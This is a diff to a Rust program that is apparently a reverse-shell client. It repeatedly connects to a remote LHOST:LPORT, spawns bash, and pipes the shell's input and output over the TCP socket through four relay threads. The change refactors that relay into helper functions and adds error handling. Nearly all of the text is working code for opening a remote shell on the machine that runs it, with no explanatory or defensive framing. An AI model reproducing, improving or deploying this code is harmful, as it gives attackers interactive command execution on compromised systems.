@@ -14,6 +14,7 @@ use std::net::*;
 use std::process::*;
 use std::io::*;
 use std::thread;
+use std::thread::JoinHandle;
 use std::sync::mpsc;
 use std::sync::mpsc::*;
 use std::time::Duration;
@@ -24,88 +25,185 @@ const SHELL_TYPE: &str = "bash";
 const RETRY_DELAY_MS: u64 = 2_000;
 const NETWORK_TIMEOUT_MS: u64 = 10_000;
 
+fn handle_network_connection(stream: TcpStream) {
+    debug!("Connected to {}", stream.peer_addr().unwrap());
+
+    debug!("Setting read/write timeout...");
+    let timeout: Option<Duration> = Some(Duration::from_millis(NETWORK_TIMEOUT_MS));
+    stream.set_read_timeout(timeout).unwrap();
+    stream.set_write_timeout(timeout).unwrap();
+
+    debug!("Cloned stream for use with channels.");
+    let cloned_stream = stream.try_clone().expect("Failed to clone TCP stream");
+
+    debug!("Connected to endpoint, starting shell");
+    let shell_child = Command::new(SHELL_TYPE)
+        .stdin(Stdio::piped())
+        .stdout(Stdio::piped())
+        .spawn()
+        .expect("Failed to run command");
+
+    debug!("Opening shell IO and creating sender / receiver channels");
+    let bash_out = shell_child.stdout.expect("Failed to open command stdout");
+    let bash_in = shell_child.stdin.expect("Failed to open command stdin");
+    let (net_tx, net_rx): (Sender<Vec<u8>>, Receiver<Vec<u8>>) = mpsc::channel();
+    let (shell_tx, shell_rx): (Sender<Vec<u8>>, Receiver<Vec<u8>>) = mpsc::channel();
+
+    debug!("Beginning IO read/write loops");
+    let thread_net_read = spawn_net_reader_thread(stream, net_tx);
+    let thread_net_write = spawn_shell_reader_thread(cloned_stream, shell_rx);
+    let thread_shell_read = spawn_shell_writer_thread(bash_out, shell_tx);
+    let thread_shell_write = spawn_net_writer_thread(bash_in, net_rx);
+
+    debug!("Waiting for threads to finish.");
+    let _ = thread_net_read.join();
+    let _ = thread_net_write.join();
+    let _ = thread_shell_read.join();
+    let _ = thread_shell_write.join();
+}
+
+fn spawn_net_reader_thread(mut stream: TcpStream, net_tx: Sender<Vec<u8>>) -> JoinHandle<()> {
+    thread::spawn(move || {
+        let mut buffer: [u8; 512] = [0; 512];
+
+        loop {
+            match stream.take_error() {
+                Ok(e) => if let Some(e) = e {
+                    error!("Stream error: {}", e);
+                    break;
+                },
+                Err(_) => {}
+            }
+
+            match stream.read(&mut buffer) {
+                Ok(count) => if count > 0 {
+                    trace!("{:>4} read from stream", count);
+
+                    match net_tx.send(Vec::from(&buffer[0..count])) {
+                        Ok(()) => {
+                            trace!("{:>4} sent to net_tx", count);
+                        }
+                        Err(e) => {
+                            error!("Failed to send to net_tx: {}", e);
+                            break;
+                        }
+                    }
+                },
+                Err(e) => {
+                    error!("Error reading from stream: {}", e);
+                    break;
+                }
+            }
+        }
+
+        debug!("net_reader_thread finished");
+    })
+}
+
+fn spawn_shell_reader_thread(mut stream: TcpStream, shell_rx: Receiver<Vec<u8>>) -> JoinHandle<()> {
+    thread::spawn(move || {
+        loop {
+            match stream.take_error() {
+                Ok(e) => if let Some(e) = e {
+                    error!("Stream error: {}", e);
+                    break;
+                },
+                Err(_) => {}
+            }
+
+            match shell_rx.recv() {
+                Ok(data) => {
+                    trace!("{:>4} received from shell_rx", data.len());
+
+                    match stream.write(data.as_slice()) {
+                        Ok(count) => trace!("{:>4} written to stream", count),
+                        Err(e) => {
+                            error!("Failed to write to stream: {}", e);
+                            break;
+                        }
+                    }
+                }
+                Err(e) => {
+                    error!("Failed to read from shell: {}", e);
+                    break;
+                }
+            }
+        }
+
+        debug!("shell_reader_thread finished");
+    })
+}
+
+fn spawn_shell_writer_thread(
+    mut bash_out: ChildStdout,
+    shell_tx: Sender<Vec<u8>>,
+) -> JoinHandle<()> {
+    thread::spawn(move || {
+        let mut buffer: [u8; 512] = [0; 512];
+
+        loop {
+            match bash_out.read(&mut buffer) {
+                Ok(count) => if count > 0 {
+                    trace!("{:>4} read from shell_out", count);
+
+                    match shell_tx.send(Vec::from(&buffer[0..count])) {
+                        Ok(()) => {
+                            trace!("{:>4} sent to shell_tx", count);
+                        }
+                        Err(e) => {
+                            error!("Failed to write to shell_tx: {}", e);
+                            break;
+                        }
+                    }
+                },
+                Err(e) => {
+                    error!("Failed to read from bash_out: {}", e);
+                    break;
+                }
+            }
+        }
+
+        debug!("shell_writer_thread finished");
+    })
+}
+
+fn spawn_net_writer_thread(mut bash_in: ChildStdin, net_rx: Receiver<Vec<u8>>) -> JoinHandle<()> {
+    thread::spawn(move || {
+        loop {
+            match net_rx.recv() {
+                Ok(data) => {
+                    trace!("{:>4} received from net_rx", data.len());
+
+                    match bash_in.write(data.as_slice()) {
+                        Ok(count) => {
+                            trace!("{:>4} written to bash_in", count);
+                        }
+                        Err(e) => {
+                            error!("Failed to write to bash_in: {}", e);
+                            break;
+                        }
+                    }
+                }
+                Err(e) => {
+                    error!("Failed to receive from net_rx: {}", e);
+                    break;
+                }
+            }
+        }
+
+        debug!("net_writer_thread finished");
+    })
+}
+
 fn main() {
     env_logger::init();
 
     loop {
         let remote_server = format!("{}:{}", LHOST, LPORT);
+        debug!("Attempting to connect to '{}'", remote_server);
 
-        debug!("Starting connect loop to '{}'", remote_server);
         match TcpStream::connect(remote_server) {
-            Ok(mut stream) => {
-                debug!("Setting read/write timeout...");
-
-                let timeout: Option<Duration> = Some(Duration::from_millis(NETWORK_TIMEOUT_MS));
-                stream.set_read_timeout(timeout).unwrap();
-                stream.set_write_timeout(timeout).unwrap();
-
-                let mut cloned_stream = stream.try_clone().expect("Failed to clone TCP stream");
-
-                debug!("Connected to endpoint, starting shell");
-                let shell_child = Command::new(SHELL_TYPE)
-                    .stdin(Stdio::piped())
-                    .stdout(Stdio::piped())
-                    .spawn()
-                    .expect("Failed to run command");
-
-                debug!("Opening shell IO");
-                let mut bash_out = shell_child.stdout.expect("Failed to open command stdout");
-                let mut bash_in = shell_child.stdin.expect("Failed to open command stdin");
-
-                let (net_tx, net_rx): (Sender<Vec<u8>>, Receiver<Vec<u8>>) = mpsc::channel();
-                let (shell_tx, shell_rx): (Sender<Vec<u8>>, Receiver<Vec<u8>>) = mpsc::channel();
-
-                debug!("Beginning IO read/write loops");
-
-                let thread_net_read = thread::spawn(move || {
-                    let mut buffer: [u8; 512] = [0; 512];
-
-                    loop {
-                        stream.take_error().unwrap();
-
-                        let count = stream.read(&mut buffer).unwrap();
-
-                        if count > 0 {
-                            debug!("{:>4} NETWORK to NET_TX", count);
-                            net_tx.send(Vec::from(&buffer[0..count])).unwrap();
-                        }
-                    }
-                });
-
-                let thread_net_write = thread::spawn(move || loop {
-                    cloned_stream.take_error().unwrap();
-
-                    let data = shell_rx.recv().unwrap();
-                    debug!("{:>4} SHELL_RX to NETWORK", data.len());
-
-                    cloned_stream.write(data.as_slice()).unwrap();
-                });
-
-                let thread_shell_read = thread::spawn(move || {
-                    let mut buffer: [u8; 512] = [0; 512];
-
-                    loop {
-                        let count = bash_out.read(&mut buffer).unwrap();
-
-                        if count > 0 {
-                            debug!("{:>4} SHELL to SHELL_TX", count);
-                            shell_tx.send(Vec::from(&buffer[0..count])).unwrap();
-                        }
-                    }
-                });
-
-                let thread_shell_write = thread::spawn(move || loop {
-                    let data = net_rx.recv().unwrap();
-                    debug!("{:>4} NET_RX to SHELL", data.len());
-                    bash_in.write(data.as_slice()).unwrap();
-                });
-
-                debug!("Waiting for threads to finish.");
-                thread_net_read.join().unwrap();
-                thread_net_write.join().unwrap();
-                thread_shell_read.join().unwrap();
-                thread_shell_write.join().unwrap();
-            }
+            Ok(stream) => handle_network_connection(stream),
             Err(_) => {
                 warn!("Failed to connect, waiting before retry");
                 std::thread::sleep(Duration::from_millis(RETRY_DELAY_MS));
